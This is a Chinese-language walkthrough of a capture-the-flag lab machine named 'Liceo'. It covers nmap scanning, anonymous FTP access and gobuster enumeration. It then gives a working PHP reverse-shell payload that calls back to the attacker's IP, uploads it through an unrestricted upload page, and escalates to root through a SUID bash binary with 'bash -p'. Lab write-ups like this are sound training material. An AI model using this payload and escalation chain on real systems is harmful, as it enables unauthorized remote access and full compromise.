Liceo
# 信息搜集

主机发现

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.2.0/24 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-18 09:57 EDT

Nmap scan report for liceoserver (192.168.2.2)
Host is up (0.00031s latency).
MAC Address: 08:00:27:69:22:0B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap scan report for kali (192.168.2.15)
Host is up.
Nmap done: 256 IP addresses (6 hosts up) scanned in 4.95 seconds
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap -sV -p- 192.168.2.2
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-18 09:58 EDT
Nmap scan report for liceoserver (192.168.2.2)
Host is up (0.00055s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
MAC Address: 08:00:27:69:22:0B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.84 seconds
```

# 漏洞利用

看一下21端口有什么

```
┌──(kali㉿kali)-[~]
└─$ ftp 192.168.2.2  
Connected to 192.168.2.2.
220 (vsFTPd 3.0.5)
Name (192.168.2.2:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||33942|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000          191 Feb 01  2024 note.txt
226 Directory send OK.
ftp> get note.txt
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||22377|)
150 Opening BINARY mode data connection for note.txt (191 bytes).
100% |************************|   191      463.98 KiB/s    00:00 ETA
226 Transfer complete.
191 bytes received in 00:00 (249.69 KiB/s)
┌──(kali㉿kali)-[~]
└─$ cat note.txt 
Hi Matias, I have left on the web the continuations of today's work, 
would you mind contiuing in your turn and make sure that the web will be secure? 
Above all, we dont't want intruders...
```

得到一个用户名Matias，目录枚举一下

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x html,php,txt,jpg,png,zip,git -u http://192.168.2.2
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.2.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              png,zip,git,html,php,txt,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 276]
/images               (Status: 301) [Size: 311] [--> http://192.168.2.2/images/]                                                          
/index.html           (Status: 200) [Size: 21487]
/.html                (Status: 403) [Size: 276]
/uploads              (Status: 301) [Size: 312] [--> http://192.168.2.2/uploads/]                                                         
/upload.php           (Status: 200) [Size: 371]
/css                  (Status: 301) [Size: 308] [--> http://192.168.2.2/css/]                                                             
/js                   (Status: 301) [Size: 307] [--> http://192.168.2.2/js/]                                                              
/.php                 (Status: 403) [Size: 276]
/.html                (Status: 403) [Size: 276]
/server-status        (Status: 403) [Size: 276]
/logitech-quickcam_w0qqcatrefzc5qqfbdz1qqfclz3qqfposz95112qqfromzr14qqfrppz50qqfsclz1qqfsooz1qqfsopz1qqfssz0qqfstypez1qqftrtz1qqftrvz1qqftsz2qqnojsprzyqqpfidz0qqsaatcz1qqsacatzq2d1qqsacqyopzgeqqsacurz0qqsadisz200qqsaslopz1qqsofocuszbsqqsorefinesearchz1.html (Status: 403) [Size: 276]
Progress: 9482032 / 9482040 (100.00%)
===============================================================
Finished
===============================================================
```

发现了/upload.php页面，和/uploads/目录，看一下/upload.php页面

<img width="343" height="185" alt="图片" src="https://github.com/user-attachments/assets/2249efdf-178d-4b18-aec0-14797b3b7cad" />

可以上传文件，尝试上传一个反弹shell

```
<?php
$sock=fsockopen("192.168.2.15",1234);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

访问一下http://192.168.2.2/uploads/shell.phtml

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.2.15] from (UNKNOWN) [192.168.2.2] 42188
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 权限提升

```
bash-5.1$ ls -la
ls -la
total 16
drwxr-xr-x 2 www-data www-data 4096 Apr 18 14:40 .
drwxr-xr-x 7 root     root     4096 Feb 10  2024 ..
-rw-r--r-- 1 www-data www-data   38 Apr 18 14:35 shell..phtml
-rw-r--r-- 1 www-data www-data  113 Apr 18 14:40 shell.phtml
bash-5.1$ cd ..
cd ..
bash-5.1$ ls -la
ls -la
total 592
drwxr-xr-x 7 root     root       4096 Feb 10  2024 .
drwxr-xr-x 3 root     root       4096 Feb 10  2024 ..
drwxr-xr-x 2 www-data www-data   4096 Sep 16  2020 css
drwxr-xr-x 2 www-data www-data   4096 Sep 16  2020 images
-rw-r--r-- 1 www-data www-data  21487 Feb 10  2024 index.html
drwxr-xr-x 2 www-data www-data   4096 Sep 16  2020 js
-rw-r--r-- 1 www-data www-data 547090 Feb  4  2024 liceoweb.zip
drwxr-xr-x 2 www-data www-data   4096 Feb  3  2024 spering-html
-rw-r--r-- 1 www-data www-data   1501 Feb 10  2024 upload.php
drwxr-xr-x 2 www-data www-data   4096 Apr 18 14:40 uploads
bash-5.1$ cd ..
cd ..
bash-5.1$ ls -la
ls -la
total 16
drwxr-xr-x  3 root root 4096 Feb 10  2024 .
drwxr-xr-x 14 root root 4096 Feb  1  2024 ..
-rw-------  1 root root   73 Feb 11  2024 .bash_history
drwxr-xr-x  7 root root 4096 Feb 10  2024 html
bash-5.1$ sudo -l
sudo -l
[sudo] password for www-data: 

Sorry, try again.
[sudo] password for www-data: 

Sorry, try again.
[sudo] password for www-data: 

sudo: 3 incorrect password attempts
//查找SUID文件
bash-5.1$ find / -perm -4000 -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
/snap/snapd/20671/usr/lib/snapd/snap-confine
/snap/snapd/19457/usr/lib/snapd/snap-confine
/snap/core20/2105/usr/bin/chfn
/snap/core20/2105/usr/bin/chsh
/snap/core20/2105/usr/bin/gpasswd
/snap/core20/2105/usr/bin/mount
/snap/core20/2105/usr/bin/newgrp
/snap/core20/2105/usr/bin/passwd
/snap/core20/2105/usr/bin/su
/snap/core20/2105/usr/bin/sudo
/snap/core20/2105/usr/bin/umount
/snap/core20/2105/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2105/usr/lib/openssh/ssh-keysign
/snap/core20/1974/usr/bin/chfn
/snap/core20/1974/usr/bin/chsh
/snap/core20/1974/usr/bin/gpasswd
/snap/core20/1974/usr/bin/mount
/snap/core20/1974/usr/bin/newgrp
/snap/core20/1974/usr/bin/passwd
/snap/core20/1974/usr/bin/su
/snap/core20/1974/usr/bin/sudo
/snap/core20/1974/usr/bin/umount
/snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1974/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/mount
/usr/bin/umount
/usr/bin/sudo
/usr/bin/bash
/usr/bin/fusermount3
/usr/libexec/polkit-agent-helper-1
//使用-p参数，-p会阻止bash降权，使进程保留SUID赋予的EUID。
bash-5.1$ /usr/bin/bash -p
/usr/bin/bash -p
bash-5.1# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```
